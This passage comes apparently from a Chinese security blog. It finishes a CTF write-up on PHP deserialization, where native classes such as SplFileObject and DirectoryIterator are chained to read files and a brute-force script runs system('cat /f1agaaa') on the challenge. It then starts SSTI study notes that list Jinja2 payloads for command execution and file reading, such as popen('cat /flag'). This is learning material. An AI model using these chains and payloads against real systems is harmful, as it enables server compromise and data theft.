language_">$this</span>-&gt;coos;<br>            <span class="hljs-variable">$bb</span> = <span class="hljs-variable language_">$this</span>-&gt;file;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$aa</span>();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个类中coos和file都可控，那么就可以利用php原生类来读取文件</p><h2 id="GlobIterator"><a href="#GlobIterator" class="headerlink" title="GlobIterator"></a><strong>GlobIterator</strong></h2><p>GlobIterator 类也可以遍历一个文件目录，但与上面略不同的是其行为类似于 <a href="https://so.csdn.net/so/search?q=glob&spm=1001.2101.3001.7020">glob</a>()，可以通过模式匹配来寻找文件路径。</p><p>它的特点就是，只需要知道部分名称就可以进行遍历</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;fuck&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;*txt&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span> = <span class="hljs-string">&#x27;GlobIterator&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">EeE</span>();<br><span class="hljs-variable">$e</span> -&gt;text = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">gBoBg</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$e</span>);<br></code></pre></td></tr></table></figure><p>拿到文件名加<code>h1nt.txt</code></p><h2 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h2><p>拿到文件名那我们直接使用SplFileObject原生类直接读</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;fuck&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;h1nt.txt&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span> = <span class="hljs-string">&#x27;SplFileObject&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">EeE</span>();<br><span class="hljs-variable">$e</span> -&gt;text = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">gBoBg</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$e</span>);<br></code></pre></td></tr></table></figure><p>但是只有</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250122162120344.png" alt="image-20250122162120344"></p><p>应该是注释掉了，使用伪协议读取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;fuck&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=h1nt.txt&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span> = <span class="hljs-string">&#x27;SplFileObject&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">EeE</span>();<br><span class="hljs-variable">$e</span> -&gt;text = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">gBoBg</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$e</span>);<br></code></pre></td></tr></table></figure><p>解码后得到</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#用于check.php</span><br><br><span class="hljs-attribute">key</span>：qwertyuiopasdfghjklzxcvbnm123456789<br><br><span class="hljs-attribute">move</span>：<span class="hljs-number">2</span>~<span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>但是不知道有什么用</p><p>尝试使用原生类扫目录试试</p><h2 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator"></a>DirectoryIterator</h2><p><code>glob:///f*</code>，这是一个 PHP 的流包装器，用于匹配根目录下的所有f开头的文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;fuck&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;glob:///f*&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span> = <span class="hljs-string">&#x27;DirectoryIterator&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">EeE</span>();<br><span class="hljs-variable">$e</span> -&gt;text = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">gBoBg</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$e</span>);<br></code></pre></td></tr></table></figure><p>找到flag的文件是f1agaaa</p><p>使用伪协议读取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;fuck&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=f1agaaa&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span> = <span class="hljs-string">&#x27;SplFileObject&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">EeE</span>();<br><span class="hljs-variable">$e</span> -&gt;text = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">gBoBg</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$e</span>);<br></code></pre></td></tr></table></figure><p>拿到flag</p><p>官方wp是flag文件是不知道的要结合给出的key和move去爆破</p><p>官方解释：</p><p>其中move是移动的意思，猜测这是一个移位的加密，其中猜测key是范围那么就有向左就有3种可能， 向右也有3种可能 但是提示2提示我们random-随机，那么加密可能是2~7随机，那么每次正好相等就是1&#x2F;24的几率</p><p>之后就想办法构造链子触发利用<code>eval</code>函数了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cycycycy</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w_wuw_w</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$aaa</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">EeE</span>();<br><span class="hljs-variable">$a</span> -&gt;text = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">gBoBg</span>();<br><span class="hljs-variable">$a</span> -&gt;text -&gt;coos = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w_wuw_w</span>();<br><span class="hljs-variable">$a</span> -&gt;text -&gt;coos -&gt;aaa = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">cycycycy</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-comment">//O:3:&quot;EeE&quot;:2:&#123;s:4:&quot;text&quot;;O:5:&quot;gBoBg&quot;:3:&#123;s:4:&quot;name&quot;;N;s:4:&quot;file&quot;;s:1:&quot;1&quot;;s:4:&quot;coos&quot;;O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;O:8:&quot;cycycycy&quot;:1:&#123;s:1:&quot;a&quot;;N;&#125;s:3:&quot;key&quot;;N;s:4:&quot;file&quot;;N;&#125;&#125;s:4:&quot;eeee&quot;;N;&#125;</span><br><br></code></pre></td></tr></table></figure><p>之后用脚本爆破key就可以了，贴一个官方的脚本 <strong>没懂</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>mi = [<span class="hljs-string">&#x27;i6xstx6d6x6ir&#x27;</span>,<span class="hljs-string">&#x27;u5zarz5s5z5ue&#x27;</span>,<span class="hljs-string">&#x27;y4lpel4a4l4yw&#x27;</span>,<span class="hljs-string">&#x27;sqnhonqjqnqsi&#x27;</span>,<span class="hljs-string">&#x27;dwmjpmwkwmwdo&#x27;</span>,<span class="hljs-string">&#x27;fe1ka1ele1efp&#x27;</span>]<br>d = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> d&lt;<span class="hljs-number">2</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> mi:<br>        data = &#123;<br>            <span class="hljs-string">&#x27;eval&#x27;</span>:<span class="hljs-string">&#x27;system(&quot;cat /f1agaaa&quot;);&#x27;</span><br>        &#125;<br>        url = <span class="hljs-string">f&quot;http://67423f19-3ba4-41b5-9e10-716ce8f5e683.challenge.ctf.show/index.php?get=<span class="hljs-subst">&#123;i&#125;</span>&quot;</span><br>        header = &#123;<br>            <span class="hljs-string">&#x27;aaaaaa&#x27;</span>:<span class="hljs-string">&#x27;O:3:&quot;EeE&quot;:2:&#123;s:4:&quot;text&quot;;O:5:&quot;gBoBg&quot;:3:&#123;s:4:&quot;name&quot;;N;s:4:&quot;file&quot;;s:1:&quot;1&quot;;s:4:&quot;coos&quot;;O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;O:8:&quot;cycycycy&quot;:1:&#123;s:1:&quot;a&quot;;N;&#125;s:3:&quot;key&quot;;N;s:4:&quot;file&quot;;N;&#125;&#125;s:4:&quot;eeee&quot;;N;&#125;&#x27;</span><br>        &#125;<br>        reqpose = requests.post(url=url,data=data,headers=header).text<br>        re_text = re.findall(<span class="hljs-string">r&quot;(?&lt;=&lt;/code&gt;).*&quot;</span>, reqpose, re.S)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> re_text:<br>            <span class="hljs-built_in">print</span>(re_text[<span class="hljs-number">0</span>])<br>            d += <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>每日一web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ssti</tag>
      
      <tag>php原生类</tag>
      
      <tag>flask加密伪造</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Djingo_ssti</title>
    <link href="/2025/01/19/Djingo_ssti/"/>
    <url>/2025/01/19/Djingo_ssti/</url>
    
    <content type="html"><![CDATA[<p>一点关于ssti的学习笔记以 Djingo为例 当然不仅仅只有python的ssti 其他语言也有，甚至Rust都有</p><p>不会就试试<strong>fenjing一把梭哈</strong></p><h1 id="常见payload"><a href="#常见payload" class="headerlink" title="常见payload"></a>常见payload</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1</span>、任意命令执行<br>&#123;%<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()%&#125;&#123;%<span class="hljs-keyword">if</span> i.__name__ ==<span class="hljs-string">&#x27;_wrap_close&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">print</span> i.__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;dir&#x27;</span>).read()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;<br><span class="hljs-number">2</span>、任意命令执行<br>&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__.__bases__[<span class="hljs-number">0</span>]. __subclasses__()[<span class="hljs-number">138</span>].__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;<br>//这个<span class="hljs-number">138</span>对应的类是os._wrap_close，只需要找到这个类的索引就可以利用这个payload<br><span class="hljs-number">3</span>、任意命令执行<br>&#123;&#123;url_for.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;<br><span class="hljs-number">4</span>、任意命令执行<br>&#123;&#123;x.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span>)&#125;&#125;<br>//x的含义是可以为任意字母，不仅仅限于x<br><span class="hljs-number">5</span>、任意命令执行<br>&#123;&#123;config.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span>)&#125;&#125;<br><span class="hljs-number">6</span>、文件读取<br>&#123;&#123;x.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read()&#125;&#125;<br>//x的含义是可以为任意字母，不仅仅限于x<br><span class="hljs-number">7.</span>任意命令执行<br>&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;cat /app/flag&#x27;</span>).read()&#125;&#125;<br><span class="hljs-number">8.</span>不出网写静态文件<br>&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;echo cat /app/flag &gt;/app/static/1.txt&#x27;</span>).read()&#125;&#125;<br><span class="hljs-number">9.</span>当config是<span class="hljs-literal">None</span>时，尝试读取current_app的config<br>&#123;&#123;url_for.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>].config&#125;&#125;<br><br></code></pre></td></tr></table></figure><h1 id="常见的内置方法"><a href="#常见的内置方法" class="headerlink" title="常见的内置方法"></a>常见的内置方法</h1><ul><li>__class__返回对象对应的类</li><li>__module__返回对应类对应的模块</li><li>__bases__返回类所有的父类</li><li>__base__返回类的基类</li><li>__name__返回类名</li><li>__mro__返回解析方法调用类的顺序的元组</li><li>_<em>subclasses</em>_()可以举所有在内存中存在的类 注意他是一个函数</li><li>__init__重新加载类的属性</li><li>__globals__会以字典的形式返回当前位置的全部全局变量</li></ul><h1 id="常见方法"><a href="#常见方法" class="headerlink" title="常见方法"></a>常见方法</h1><p>获取键值或下标的方式</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dict<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]</span><br>dict.<span class="hljs-built_in">__getitem__</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br>dict<span class="hljs-selector-class">.pop</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br>dict<span class="hljs-selector-class">.get</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br>dict<span class="hljs-selector-class">.setdefault</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br>list<span class="hljs-selector-attr">[0]</span><br>list.<span class="hljs-built_in">__getitem__</span>(<span class="hljs-number">0</span>)<br>list<span class="hljs-selector-class">.pop</span>(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>获取属性的方式</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">().<span class="hljs-emphasis">__class__</span><br>()[&quot;<span class="hljs-emphasis">__class__</span>&quot;]<br>()|attr(&quot;<span class="hljs-emphasis">__class__</span>&quot;)<br>().<span class="hljs-emphasis">__getattribute__</span>(&quot;<span class="hljs-emphasis">__class__</span>&quot;)<br></code></pre></td></tr></table></figure><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs clean">&#123;%%&#125;可以用来声明变量，当然也可以用于循环语句和条件语句。<br>&#123;&#123;&#125;&#125;用于将表达式打印到模板输出<br>&#123;##&#125;表示未包含在模板输出中的注释<br>\##可以有和&#123;%%&#125;相同的效果<br></code></pre></td></tr></table></figure>{%set%}拼接<figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="language-xml">c.构造popen</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> c=dict(po=a,pen=a)|<span class="hljs-name">join</span>%&#125;</span><br></code></pre></td></tr></table></figure><h1 id="1-什么是SSTI模板注入"><a href="#1-什么是SSTI模板注入" class="headerlink" title="1.什么是SSTI模板注入"></a>1.什么是SSTI模板注入</h1><p>SSTI，服务端模板注入，其实也就是模板引擎+注入, 那么我们首先需要了解一下模板引擎</p><p>模板只是一种提供给程序来解析的一种语法，换句话说，模板是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。</p><p>通俗点理解：拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。也就是html框架</p><p>常见的模板引擎：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-symbol">PHP:</span> Smarty, Twig, <span class="hljs-keyword">Blade</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">java: </span><span class="hljs-keyword">JSP, </span>FreeMarker, Velocity<br><span class="hljs-symbol">Python:</span> <span class="hljs-keyword">Jinja2, </span>django, tornado<br></code></pre></td></tr></table></figure><p>简单的ssti</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request,render_template_string<br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    name = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>)<br>    template = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&lt;html&gt;</span><br><span class="hljs-string">  &lt;head&gt;</span><br><span class="hljs-string">    &lt;title&gt;SSTI&lt;/title&gt;</span><br><span class="hljs-string">  &lt;/head&gt;</span><br><span class="hljs-string"> &lt;body&gt;</span><br><span class="hljs-string">      &lt;h3&gt;Hello, %s !&lt;/h3&gt;</span><br><span class="hljs-string">  &lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;</span><br><span class="hljs-string">        &#x27;&#x27;&#x27;</span>% (name)<br>    <span class="hljs-keyword">return</span> render_template_string(template)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">8888</span>, debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure>当我们输入name是可控的,使用的是%S来实现动态的字符串控制，而Flask使用的是jinja2模板，我们可以传入{{}}，`{{}}`在`Jinja2`中作为变量包裹标识符，`Jinja2`在渲染的时候会把{{}}包裹的内容进行解析，就可以执行命令。<h1 id="2-SSTI前置知识"><a href="#2-SSTI前置知识" class="headerlink" title="2.SSTI前置知识"></a>2.SSTI前置知识</h1><p>主要了解一点Python的魔术方法和内置类</p><p><code>__class__</code>用于返回该对象所属的类<br>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;abcd&#x27;</span>.__class__<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>().__class__<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;tuple&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><p><code>__base__</code>用于获取类的基类<br>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__.__base__<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;<br>//<span class="hljs-built_in">object</span>为<span class="hljs-built_in">str</span>的基类<br></code></pre></td></tr></table></figure><p><code>__mro__</code>返回解析方法调用的顺序的元组。（当调用_mro_[1]或者-1时作用其实等同于_base_）<br>示例：</p><figure class="highlight python"><table><tr><td 